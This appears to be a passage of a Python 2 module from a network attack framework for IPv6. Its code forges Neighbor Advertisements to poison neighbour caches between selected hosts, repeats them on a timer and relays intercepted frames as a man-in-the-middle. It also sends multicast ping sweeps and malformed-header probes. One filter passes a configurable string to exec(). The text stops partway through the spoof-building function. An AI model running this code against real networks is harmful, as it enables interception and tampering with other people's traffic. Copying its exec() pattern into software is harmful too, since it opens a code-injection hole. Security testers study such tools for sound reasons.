#       module_icmp6.py
#       
#       Copyright 2010 Daniel Mende <dmende@ernw.de>
#

#       Redistribution and use in source and binary forms, with or without
#       modification, are permitted provided that the following conditions are
#       met:
#       
#       * Redistributions of source code must retain the above copyright
#         notice, this list of conditions and the following disclaimer.
#       * Redistributions in binary form must reproduce the above
#         copyright notice, this list of conditions and the following disclaimer
#         in the documentation and/or other materials provided with the
#         distribution.
#       * Neither the name of the  nor the names of its
#         contributors may be used to endorse or promote products derived from
#         this software without specific prior written permission.
#       
#       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#       "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#       LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#       A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#       OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#       SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#       LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#       DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#       THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#       (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import random
import threading
import time

import dpkt
import pcap
import dnet
import struct

import IPy

gobject = None
gtk = None
urwid = None

MLDV2_LISTENER_REPORT=143
LL_ALL_ROUTERS="fe02::2"


### HELPER_FUNKTIONS ###

def ichecksum_func(data, sum=0):
    ''' Compute the Internet Checksum of the supplied data.  The checksum is
    initialized to zero.  Place the return value in the checksum field of a
    packet.  When the packet is received, check the checksum, by passing
    in the checksum field of the packet and the data.  If the result is zero,
    then the checksum has not detected an error.
    '''
    # make 16 bit words out of every two adjacent 8 bit words in the packet
    # and add them up
    for i in xrange(0,len(data),2):
        if i + 1 >= len(data):
            sum += ord(data[i]) & 0xFF
        else:
            w = ((ord(data[i]) << 8) & 0xFF00) + (ord(data[i+1]) & 0xFF)
            sum += w

    # take only 16 bits out of the 32 bit sum and add up the carries
    while (sum >> 16) > 0:
        sum = (sum & 0xFFFF) + (sum >> 16)

    # one's complement the result
    sum = ~sum

    return sum & 0xFFFF
    
class spoof_thread(threading.Thread):
    def __init__(self, parent):
        threading.Thread.__init__(self)
        self.parent = parent
        self.running = True
        self.reset = False

    def run(self):
        self.parent.log("ICMP6: Spoof thread started")        
        while self.running:
            if self.parent.dnet:
                for iter in self.parent.spoofs:
                    (run, entry, org_data, hosts) = self.parent.spoofs[iter]
                    if run:
                        for data in entry:
                            self.parent.dnet.send(data)
                            time.sleep(0.001)
            for x in xrange(self.parent.spoof_delay):
                if not self.running:
                    break
                if self.reset:
                    self.reset = False
                    break
                time.sleep(1)
        for h in xrange(3):
            for i in self.parent.spoofs:
                (run, data, org_data, hosts) = self.parent.spoofs[i]
                if run:
                    for j in org_data:
                        self.parent.dnet.eth.send(j)
        self.parent.log("ICMP6: Spoof thread terminated")

    def wakeup(self):
        self.reset = True

    def quit(self):
        self.running = False

class mod_class(object):
    def __init__(self, parent, platform, ui):
        self.parent = parent
        self.platform = platform
        self.ui = ui
        self.name = "icmp6"
        self.gladefile = "/modules/module_icmp6.glade"
        self.macfile = "/modules/mac.txt"
        if ui == 'gtk':            
            import gobject as gobject_
            import gtk as gtk_
            import gtk.glade as glade_
            global gobject
            global gtk
            gobject = gobject_
            gtk = gtk_
            gtk.glade = glade_
            self.hosts_liststore = gtk.ListStore(str, str, str, str)
            self.upper_add_liststore = gtk.ListStore(str, str)
            self.lower_add_liststore = gtk.ListStore(str, str)
            self.spoof_treestore = gtk.TreeStore(gtk.gdk.Pixbuf, str, str, str)
            self.mappings_liststore = gtk.ListStore(str, str)
        elif ui == 'urw':
            import urwid as urwid_
            global urwid
            urwid = urwid_
            self.spoof_tree = { "children" : [] }
            
            class SpoofWidget_(urwid.TreeWidget):
                unexpanded_icon = urwid.AttrMap(urwid.TreeWidget.unexpanded_icon, 'dirmark')
                expanded_icon = urwid.AttrMap(urwid.TreeWidget.expanded_icon, 'dirmark')
                
                def __init__(self, node):
                    urwid.TreeWidget.__init__(self, node)        
                    self._w = urwid.AttrWrap(self._w, 'body', 'focus')
                    self.flagged = False
                
                def get_display_text(self):
                    node = self.get_node()
                    val = node.get_value()
                    if node.get_depth() == 2:
                        return "%s <-> %s" % (val["host_upper"], val["host_lower"])
                    elif node.get_depth() == 1:
                        return "%d Spoofs" % len(val["children"])
                    else:
                        return "Spoofings:"
                
                    def selectable(self):
                        if self.get_node().get_depth() <= 1:
                            return True
                        return False

                def keypress(self, size, key):
                    key = urwid.TreeWidget.keypress(self, size, key)
                    if key:
                        key = self.unhandled_keys(size, key)
                    return key

                def unhandled_keys(self, size, key):
                    if self.get_node().get_depth() == 1:
                        if key == "enter":
                            value = self.get_node().get_value()
                            cb = value["callback"]
                            if "args" in value:
                                cb(self, value["args"])
                            else:
                                cb(self)
                    return key
            self.SpoofWidget = SpoofWidget_

            class SpoofNode_(urwid.TreeNode):
                def load_widget(self):
                    return SpoofWidget_(self)
            self.SpoofNode = SpoofNode_

            class SpoofParentNode_(urwid.ParentNode):
                def load_widget(self):
                    return SpoofWidget_(self)
                
                def load_child_keys(self):
                    val = self.get_value()
                    return range(len(val["children"]))
                
                def load_child_node(self, key):
                    childdata = self.get_value()['children'][key]
                    childdepth = self.get_depth() + 1
                    if 'children' in childdata:
                        childclass = SpoofParentNode_
                    else:
                        childclass = SpoofNode_
                    return childclass(childdata, parent=self, key=key, depth=childdepth)
            self.SpoofParentNode = SpoofParentNode_
        self.dnet = None
        self.spoof_thread = None
        self.macs = None
        self.mac = None
        self.spoof_delay = 30
        self.forward_constrain = "a=True"
    
    def start_mod(self):
        self.spoof_thread = spoof_thread(self)
        self.hosts = {}
        self.upper_add = {}
        self.lower_add = {}
        self.spoofs = {}
        if not self.macs:
            self.macs = self.parse_macs(self.parent.data_dir + self.macfile)

    def shut_mod(self):
        if self.spoof_thread:
            self.spoof_thread.quit()
        if self.ui == 'gtk':
            self.hosts_liststore.clear()
            self.upper_add_liststore.clear()
            self.lower_add_liststore.clear()
            self.spoof_treestore.clear()
            self.mappings_liststore.clear()

    def get_root(self):
        self.glade_xml = gtk.glade.XML(self.parent.data_dir + self.gladefile)
        dic = { "on_add_upper_button_clicked" : self.on_add_upper_button_clicked,
                "on_add_lower_button_clicked" : self.on_add_lower_button_clicked,
                "on_add_spoof_button_clicked" : self.on_add_spoof_button_clicked,
                "on_clear_spoof_button_clicked" : self.on_clear_spoof_button_clicked,
                "on_remove_spoof_button_clicked" : self.on_remove_spoof_button_clicked,
                "on_stop_spoof_button_clicked" : self.on_stop_spoof_button_clicked,
                "on_start_spoof_button_clicked" : self.on_start_spoof_button_clicked,
                "on_scan_start_button_clicked" : self.on_scan_start_button_clicked,
                "on_invalid_header_scan_button_clicked" : self.on_invalid_header_scan_button_clicked,
                "on_invalid_option_scan_button_clicked" : self.on_invalid_option_scan_button_clicked
                }
        self.glade_xml.signal_autoconnect(dic)

        self.hosts_treeview = self.glade_xml.get_widget("hosts_treeview")
        self.hosts_treeview.set_model(self.hosts_liststore)
        self.hosts_treeview.set_headers_visible(True)

        column = gtk.TreeViewColumn()
        column.set_title("MAC address")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 0)
        self.hosts_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("IP address")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 1)
        self.hosts_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("Flags")
        render_text = gtk.CellRendererText()
        render_text.set_property('xalign', 0.5)
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 2)
        self.hosts_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("Vendor")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 3)
        self.hosts_treeview.append_column(column)
        self.hosts_treeview.get_selection().set_mode(gtk.SELECTION_MULTIPLE)

        self.upper_add_treeview = self.glade_xml.get_widget("upper_add_treeview")
        self.upper_add_treeview.set_model(self.upper_add_liststore)
        self.upper_add_treeview.set_headers_visible(False)

        column = gtk.TreeViewColumn()
        column.set_title("MAC address")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 0)
        self.upper_add_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("IP address")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 1)
        self.upper_add_treeview.append_column(column)

        self.lower_add_treeview = self.glade_xml.get_widget("lower_add_treeview")
        self.lower_add_treeview.set_model(self.lower_add_liststore)
        self.lower_add_treeview.set_headers_visible(False)

        column = gtk.TreeViewColumn()
        column.set_title("MAC address")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 0)
        self.lower_add_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        column.set_title("IP address")
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 1)
        self.lower_add_treeview.append_column(column)

        self.spoof_treeview = self.glade_xml.get_widget("spoof_treeview")
        self.spoof_treeview.set_model(self.spoof_treestore)
        self.spoof_treeview.set_headers_visible(False)

        column = gtk.TreeViewColumn()
        render_pixbuf = gtk.CellRendererPixbuf()
        column.pack_start(render_pixbuf, expand=False)
        column.add_attribute(render_pixbuf, 'pixbuf', 0)
        self.spoof_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 1)
        self.spoof_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 2)
        self.spoof_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 3)
        self.spoof_treeview.append_column(column)

        self.mappings_treeview = self.glade_xml.get_widget("mappings_treeview")
        self.mappings_treeview.set_model(self.mappings_liststore)
        self.mappings_treeview.set_headers_visible(True)
        
        column = gtk.TreeViewColumn()
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=False)
        column.add_attribute(render_text, 'text', 0)
        column.set_title("Real MAC")
        self.mappings_treeview.append_column(column)
        column = gtk.TreeViewColumn()
        render_text = gtk.CellRendererText()
        column.pack_start(render_text, expand=True)
        column.add_attribute(render_text, 'text', 1)
        column.set_title("Random MAC")
        self.mappings_treeview.append_column(column)

        self.scan_network_entry = self.glade_xml.get_widget("scan_network_entry")
        self.flood_no_spinbutton = self.glade_xml.get_widget("flood_no_spinbutton")
        self.flood_togglebutton = self.glade_xml.get_widget("flood_togglebutton")

        self.offline = self.hosts_treeview.render_icon(gtk.STOCK_NO, 1)
        self.online = self.hosts_treeview.render_icon(gtk.STOCK_YES, 1)

        return self.glade_xml.get_widget("root")

    def get_urw(self):
        hostlist = [ urwid.AttrMap(urwid.Text("Hostlist"), 'header'), urwid.Divider() ]
        self.hostlist = urwid.SimpleListWalker(hostlist)
        hostlist = urwid.LineBox(urwid.ListBox(self.hostlist))
        targets1 = [ urwid.AttrMap(urwid.Text("Targets 1"), 'header'), urwid.Divider() ]
        self.targetlist = self.targets1 = urwid.SimpleListWalker(targets1)
        targets1 = urwid.LineBox(urwid.ListBox(self.targets1))
        targets2 = [ urwid.AttrMap(urwid.Text("Targets 2"), 'header'), urwid.Divider() ]
        self.targets2 = urwid.SimpleListWalker(targets2)
        targets2 = urwid.LineBox(urwid.ListBox(self.targets2))
        spoofs = urwid.LineBox(urwid.TreeListBox(urwid.TreeWalker(self.SpoofParentNode(self.spoof_tree))))
        
        bgroup = []
        radio1 = urwid.RadioButton(bgroup, "Targets1", on_state_change=self.urw_radio_changed, user_data=self.targets1)
        radio2 = urwid.RadioButton(bgroup, "Targets2", on_state_change=self.urw_radio_changed, user_data=self.targets2)

        button1 = self.parent.menu_button("Ping all Nodes", self.urw_ping_activated)
        button2 = self.parent.menu_button("Send invalid Header", self.urw_header_activated)
        button3 = self.parent.menu_button("Send invalid Options", self.urw_options_activated)
        button4 = self.parent.menu_button("Add Spoofing", self.urw_add_activated)
        radio = urwid.ListBox(urwid.SimpleListWalker([radio1, radio2, urwid.Divider(), button1, button2, button3, button4]))
        
        self.pile = urwid.Pile([('weight', 3, urwid.Columns([urwid.Pile([('weight', 2, hostlist), radio]), urwid.Pile([targets1, targets2])])), spoofs])
        return self.pile
    
    def urw_spoof_activated(self, widget, spoof):
        widget.flagged = not widget.flagged
        if widget.flagged:
            widget._w.attr = 'flagged'
            widget._w.focus_attr = 'flagged focus'
            (run, data, org_data, hosts) = self.spoofs[spoof]
            self.spoofs[spoof] = (True, data, org_data, hosts)
            for i in hosts:
                (ip, rand_mac, iter, reply) = self.hosts[i]
                self.hosts[i] = (ip, rand_mac, iter, True)
            if not self.spoof_thread.is_alive():
                self.spoof_thread.start()
            self.spoof_thread.wakeup()
        else:
            widget._w.attr = 'body'
            widget._w.focus_attr = 'focus'
            (run, data, org_data, hosts) = self.spoofs[spoof]
            if run:
                self.spoofs[spoof] = (False, data, org_data, hosts)
                for j in org_data:
                    self.dnet.eth.send(j)
            for i in hosts:
                (ip, rand_mac, iter, reply) = self.hosts[i]
                self.hosts[i] = (ip, rand_mac, iter, False)
    
    def urw_add_activated(self, button):
        if not len(self.upper_add):
            return
        if not len(self.lower_add):
            return
        spoofs = []
        for host_upper in self.upper_add:
            for host_lower in self.lower_add:
                spoofs.append({  "host_upper" : host_upper,
                                 "host_lower" : host_lower })
        (data, org_data, hosts) = self.add_spoof()
        self.spoofs[str(spoofs)] = (False, data, org_data, hosts)
        for i in self.targets1:
            if type(i.base_widget) == urwid.Button:
                self.targets1.remove(i)
        for i in self.targets2:
            if type(i.base_widget) == urwid.Button:
                self.targets2.remove(i)
        self.spoof_tree["children"].append({ "children" : spoofs,
                                             "callback" : self.urw_spoof_activated,
                                             "args"     : str(spoofs) 
                                             })
        self.pile.contents[1] = (urwid.LineBox(urwid.TreeListBox(urwid.TreeWalker(self.SpoofParentNode(self.spoof_tree)))), ('weight', 1))
        
    def urw_ping_activated(self, button):
        self.scan()
    
    def urw_header_activated(self, button):
        self.invalid_header()
    
    def urw_options_activated(self, button):
        self.invalid_option()
    
    def urw_radio_changed(self, button, state, target):
        if state:
            self.targetlist = target
    
    def urw_targetlist_activated(self, _, (targetlist, button, host)):
        if host in self.upper_add:
            del self.upper_add[host]
        if host in self.lower_add:
            del self.lower_add[host]
        targetlist.remove(button)
    
    def urw_hostlist_activated(self, button, host):
        if host not in self.upper_add:
            if host not in self.lower_add:
                if self.targetlist == self.targets1:
                    add = self.upper_add
                elif self.targetlist == self.targets2:
                    add = self.lower_add
                (ip, rand_mac, _, reply) = self.hosts[host]
                add[host] = (ip, rand_mac, None)
                button = self.parent.menu_button(host)
                urwid.connect_signal(button.base_widget, 'click', self.urw_targetlist_activated, (self.targetlist, button, host))
                self.targetlist.append(button)
    

    def log(self, msg):
        self.__log(msg, self.name)

    def set_log(self, log):
        self.__log = log

    def set_ip6(self, ip, mask, ip_ll, mask_ll):
        self.ip = dnet.ip6_aton(ip)
        self.ip6_ll = ip_ll
        self.mask6_ll = mask_ll

    def set_dnet(self, dnet_thread):
        self.dnet = dnet_thread
        self.mac = dnet_thread.eth.get()

    def get_ip6_checks(self):
        return (self.check_ip6, self.input_ip6)

    def check_ip6(self, ip6):
        if dnet.ip6_ntoa(ip6.src) == "::":
            return (False, False)
        return (True, False)

    def input_ip6(self, eth, ip6, timestamp):
        if eth.src == self.mac:
            return
        
        if ip6.nxt == dpkt.ip.IP_PROTO_ICMP6:
            icmp6 = dpkt.icmp6.ICMP6(str(ip6.data))
            mac = dnet.eth_ntoa(str(eth.src))
            if self.mac:
                if icmp6.type == dpkt.icmp6.ND_NEIGHBOR_SOLICIT:
                    ip6_dst = dnet.ip6_ntoa(str(icmp6.data)[4:20])
                    for h in self.hosts:
                        if mac == h:
                            (ip6_src, rand_mac_src, iter_src, reply_src) = self.hosts[mac]
                            for i in self.hosts:
                                (ip6, rand_mac_dst, iter_dst, reply_dst) = self.hosts[i]
                                if ip6_dst == ip6:
                                    break
                            if reply_src and reply_dst:
                                _icmp6 = dpkt.icmp6.ICMP6(  type=dpkt.icmp6.ND_NEIGHBOR_SOLICIT,
                                                            code=0,
                                                            data=struct.pack("!L16sBB6s", 0x60000000, dnet.ip6_aton(ip6_dst), 1, 1, rand_mac_dst)
                                                            )
                                _eth = dpkt.ethernet.Ethernet(  dst=eth.src,
                                                                src=dnet.eth_aton(rand_mac_dst),
                                                                type=dpkt.ip.IP_PROTO_IP6,
                                                                data=str(_icmp6)
                                                                )
                                self.dnet.send(str(_eth))
                                break
            if icmp6.type == dpkt.icmp6.ND_ROUTER_ADVERT:
                if mac in self.hosts:
                    (ip, random_mac, iter, reply) = self.hosts[mac]
                    if self.ui == 'gtk':
                        self.hosts_liststore.set(iter, 2, "R")
            for h in self.hosts:
                if mac == h:
                    return
                (ip, random_mac, iter, reply) = self.hosts[h]
                if mac == random_mac:
                    return
            ip = dnet.ip6_ntoa(ip6.src)
            if ip == "::":
                return            
            rand_mac = [ 0x00, random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff) ]
            rand_mac = ':'.join(map(lambda x: "%02x" % x, rand_mac))
            if self.ui == 'gtk':
                iter = self.hosts_liststore.append([mac, ip, "", self.mac_to_vendor(mac)])
            elif self.ui == 'urw':
                self.hostlist.append(self.parent.menu_button("%s(%s) - %s" % (mac, self.mac_to_vendor(mac), ip), self.urw_hostlist_activated, mac))
                iter = None
            self.hosts[mac] = (dnet.ip6_ntoa(ip6.src), rand_mac, iter, False)
            if self.ui == 'gtk':
                self.mappings_liststore.append([mac, rand_mac])

    def get_eth_checks(self):
        return (self.check_eth, self.input_eth)

    def check_eth(self, eth):
        if eth.type == dpkt.ethernet.ETH_TYPE_IP6:
            ip6 = dpkt.ip6.IP6(str(eth.data))
            a = False
            exec(self.forward_constrain)
            if a:
                return (True, False)
            else:
                return (False, False)
        return (False, False)

    def input_eth(self, eth, timestamp):
        src = dnet.eth_ntoa(str(eth.src))
        dst = dnet.eth_ntoa(str(eth.dst))
        good = False
        for h in self.hosts:
            (ip, rand_mac, iter, reply) = self.hosts[h]
            if src == h:
                eth.src = dnet.eth_aton(rand_mac)
                ref_src = h
                if good:
                    self.dnet.send(str(eth))
                    if self.ui == 'gtk':
                        self.spoof_treestore.foreach(self.inc_packet_counter, (ref_src, ref_dst))
                    return
                else:
                    good = True
            if dst == rand_mac:
                eth.dst = dnet.eth_aton(h)
                ref_dst = h
                if good:
                    self.dnet.send(str(eth))
                    if self.ui == 'gtk':
                        self.spoof_treestore.foreach(self.inc_packet_counter, (ref_src, ref_dst))
                    return
                else:
                    good = True

    def inc_packet_counter(self, model, path, iter, user_data):
        if model.iter_has_child(iter):
            return False
        (ref_src, ref_dst) = user_data
        (src, dst, count) = model.get(iter, 1, 2, 3)
        if (src == ref_src and dst == ref_dst) or (dst == ref_src and src == ref_dst):
            self.spoof_treestore.set(iter, 3, str(int(count) + 1))
            return True
        return False

    def parse_macs(self, file):
        macs = {}
        f = open(file, "r")
        for l in f:
            s = l.split()
            if len(s) < 2:
                continue
            macs[s[0]] = " ".join(s[1:])
        return macs

    def mac_to_vendor(self, mac):
        mac = mac.replace(":", "-")
        try:
            vendor = self.macs[mac[0:8].upper()]
        except:
            vendor = "Unknown"
        return vendor

    def scan(self):
        echo6 = dpkt.icmp6.ICMP6.Echo(  id=1234,
                                        seq=56789,
                                        data="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                                        )
        icmp6 = dpkt.icmp6.ICMP6(   type=dpkt.icmp6.ICMP6_ECHO_REQUEST,
                                    code=0,
                                    data=echo6
                                    )
        icmp6_str = str(icmp6)
        ip6 = dpkt.ip6.IP6( src=dnet.ip6_aton(self.ip6_ll),
                            dst=dnet.ip6_aton("ff02::1"),
                            nxt=dpkt.ip.IP_PROTO_ICMP6,
                            hlim=64,
                            data=icmp6,
                            plen=len(icmp6_str)
                            )
        ip6.extension_hdrs={}
        for i in dpkt.ip6.ext_hdrs:
            ip6.extension_hdrs[i]=None
        ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, ip6.plen, ip6.nxt)
        icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
        eth = dpkt.ethernet.Ethernet(   src=self.mac,
                                        dst=dnet.eth_aton("33:33:00:00:00:01"),
                                        data=str(ip6),
                                        type=dpkt.ethernet.ETH_TYPE_IP6
                                        )
        self.dnet.send(str(eth))
        
    def invalid_header(self):
        echo6 = dpkt.icmp6.ICMP6.Echo(  id=1234,
                                        seq=56789,
                                        data="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                                        )
        icmp6 = dpkt.icmp6.ICMP6(   type=dpkt.icmp6.ICMP6_ECHO_REQUEST,
                                    code=0,
                                    data=echo6
                                    )
        icmp6_str = str(icmp6)
        rand = "".join([ chr(random.randint(0x00, 0xff)) for i in xrange(14) ])
        data_str = struct.pack("!BB14s", dpkt.ip.IP_PROTO_ICMP6, 1, rand) + icmp6_str
        ip6 = dpkt.ip6.IP6( src=dnet.ip6_aton(self.ip6_ll),
                            dst=dnet.ip6_aton("ff02::1"),
                            nxt=159,
                            hlim=64,
                            plen=len(data_str)
                            )
        ip6.extension_hdrs={}
        for i in dpkt.ip6.ext_hdrs:
            ip6.extension_hdrs[i]=None
        ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, len(icmp6_str), dpkt.ip.IP_PROTO_ICMP6)
        icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
        icmp6_str = str(icmp6)
        data_str = struct.pack("!BB14s", dpkt.ip.IP_PROTO_ICMP6, 1, rand) + icmp6_str
        ip6.data = data_str
        eth = dpkt.ethernet.Ethernet(   src=self.mac,
                                        dst=dnet.eth_aton("33:33:00:00:00:01"),
                                        data=str(ip6),
                                        type=dpkt.ethernet.ETH_TYPE_IP6
                                        )
        self.dnet.send(str(eth))

    def invalid_option(self):
        echo6 = dpkt.icmp6.ICMP6.Echo(  id=1234,
                                        seq=56789,
                                        data="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                                        )
        icmp6 = dpkt.icmp6.ICMP6(   type=dpkt.icmp6.ICMP6_ECHO_REQUEST,
                                    code=0,
                                    data=echo6
                                    )
        icmp6_str = str(icmp6)
        ip6 = dpkt.ip6.IP6( src=dnet.ip6_aton(self.ip6_ll),
                            dst=dnet.ip6_aton("ff02::1"),
                            nxt=dpkt.ip.IP_PROTO_HOPOPTS,
                            hlim=1,
                            data=icmp6,
                            plen=len(icmp6_str)
                            )
        ip6.extension_hdrs={}
        for i in dpkt.ip6.ext_hdrs:
            ip6.extension_hdrs[i]=None
        rand = "".join([ chr(random.randint(0x00, 0xff)) for i in xrange(13) ])
        hopopt = dpkt.ip6.IP6HopOptsHeader(nxt=dpkt.ip.IP_PROTO_ICMP6, len=1, data=struct.pack("!B13s", 1, rand))
        ip6.extension_hdrs[dpkt.ip.IP_PROTO_HOPOPTS] = hopopt
        ip6.plen = ip6.plen + len(str(hopopt))
        ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, len(icmp6_str), dpkt.ip.IP_PROTO_ICMP6)
        icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
        eth = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton("33:33:00:00:00:01"),
                                        src=self.mac,
                                        data=str(ip6),
                                        type=dpkt.ethernet.ETH_TYPE_IP6
                                        )
        self.dnet.send(str(eth))
    
    
    def add_spoof(self):
        data = []
        org_data = []
        hosts = []
        for host_upper in self.upper_add:
            (ip_upper, rand_mac_upper, iter_upper) = self.upper_add[host_upper]
            for host_lower in self.lower_add:
                (ip_lower, rand_mac_lower, iter_lower) = self.lower_add[host_lower]
                
                advert = struct.pack("!I16sBB6s", 0x60000000, dnet.ip6_aton(ip_upper), 2, 1, dnet.eth_aton(rand_mac_upper))
                icmp6 = dpkt.icmp6.ICMP6(   type=dpkt.icmp6.ND_NEIGHBOR_ADVERT,
                                            code=0,
                                            data=advert
                                            )
                icmp6_str = str(icmp6)
                ip6 = dpkt.ip6.IP6( src=dnet.ip6_aton(ip_upper),
                                    dst=dnet.ip6_aton(ip_lower),
                                    nxt=dpkt.ip.IP_PROTO_ICMP6,
                                    hlim=255,
                                    data=icmp6,
                                    plen=len(icmp6_str)
                                    )
                ip6.extension_hdrs={}
                for i in dpkt.ip6.ext_hdrs:
                    ip6.extension_hdrs[i]=None
                ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, ip6.plen, ip6.nxt)
                icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
                eth = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton(host_lower),
                                                src=dnet.eth_aton(rand_mac_upper),
                                                data=str(ip6),
                                                type=dpkt.ethernet.ETH_TYPE_IP6
                                                )
                data.append(str(eth))
                advert = struct.pack("!I16sBB6s", 0x60000000, dnet.ip6_aton(ip_lower), 2, 1, dnet.eth_aton(host_upper))
                icmp6 = dpkt.icmp6.ICMP6(   type=dpkt.icmp6.ND_NEIGHBOR_ADVERT,
                                            code=0,
                                            data=advert
                                            )
                icmp6_str = str(icmp6)
                ip6 = dpkt.ip6.IP6( src=dnet.ip6_aton(ip_upper),
                                    dst=dnet.ip6_aton(ip_lower),
                                    nxt=dpkt.ip.IP_PROTO_ICMP6,
                                    hlim=255,
                                    data=icmp6,
                                    plen=len(icmp6_str)
                                    )
                ip6.extension_hdrs={}
                for i in dpkt.ip6.ext_hdrs:
                    ip6.extension_hdrs[i]=None
                ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, ip6.plen, ip6.nxt)
                icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
                eth = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton(host_lower),
                                                src=dnet.eth_aton(host_upper),
                                                data=str(ip6),
                                                type=dpkt.ethernet.ETH_TYPE_IP6
                                                )
                org_data.append(str(eth))
                

                advert = struct.pack("!I16sBB6s", 0x60000000, dnet.ip6_aton(ip_lower), 2, 1, dnet.eth_aton(rand_mac_lower))
                icmp6 = dpkt.icmp6.ICMP6(   type=dpkt.icmp6.ND_NEIGHBOR_ADVERT,
                                            code=0,
                                            data=advert
                                            )
                icmp6_str = str(icmp6)
                ip6 = dpkt.ip6.IP6( src=dnet.ip6_aton(ip_lower),
                                    dst=dnet.ip6_aton(ip_upper),
                                    nxt=dpkt.ip.IP_PROTO_ICMP6,
                                    hlim=255,
                                    data=icmp6,
                                    plen=len(icmp6_str)
                                    )
                ip6.extension_hdrs={}
                for i in dpkt.ip6.ext_hdrs:
                    ip6.extension_hdrs[i]=None
                ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, ip6.plen, ip6.nxt)
                icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
                eth = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton(host_upper),
                                                src=dnet.eth_aton(rand_mac_lower),
                                                data=str(ip6),
                                                type=dpkt.ethernet.ETH_TYPE_IP6
                                                )
                data.append(str(eth))
                advert = struct.pack("!I16sBB6s", 0x60000000, dnet.ip6_aton(ip_lower), 2, 1, dnet.eth_aton(host_lower))
                icmp6 = dpkt.icmp6.ICMP6(   type=dpkt.icmp6.ND_NEIGHBOR_ADVERT,
                                            code=0,
                                            data=advert
                                            )
                icmp6_str = str(icmp6)
                ip6 = dpkt.ip6.IP6( src=dnet.ip6_aton(ip_lower),
                                    dst=dnet.ip6_aton(ip_upper),
                                    nxt=dpkt.ip.IP_PROTO_ICMP6,
                                    hlim=255,
                                    data=icmp6,
                                    plen=len(icmp6_str)
                                    )
                ip6.extension_hdrs={}
                for i in dpkt.ip6.ext_hdrs:
                    ip6.extension_hdrs[i]=None
                ip6_pseudo = struct.pack('!16s16sIxxxB', ip6.src, ip6.dst, ip6.plen, ip6.nxt)
                icmp6.sum = ichecksum_func(ip6_pseudo + icmp6_str)
                eth = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton(host_upper),
                                                src=dnet.eth_aton(host_lower),
                                                data=str(ip6),
                                                type=dpkt.ethernet.ETH_TYPE_IP6
                                                )
                org_data.append(str(eth))
                
            hosts.append(host_upper)

            mld = struct.pack("!xxHBBH16s", 1, 4, 0, 0, dnet.ip6_aton("ff02::1:ff00:0000")[:13] + dnet.ip6_aton(ip_upper)[13:])
            icmp6 = dpkt.icmp6.ICMP6(   type=143,
                                        code=0,
                                        data=mld
                                        )
            icmp6_str = str(icmp6)
            ip6 = dpkt.ip6.IP6( src=dnet.ip6_aton(ip_upper),
                                dst=dnet.ip6_aton("ff02::16"),
                                nxt=dpkt.ip.IP_PROTO_HOPOPTS,
                                hlim=1,
                                data=icmp6,
                                plen=len(icmp6_str) + 8
                                )
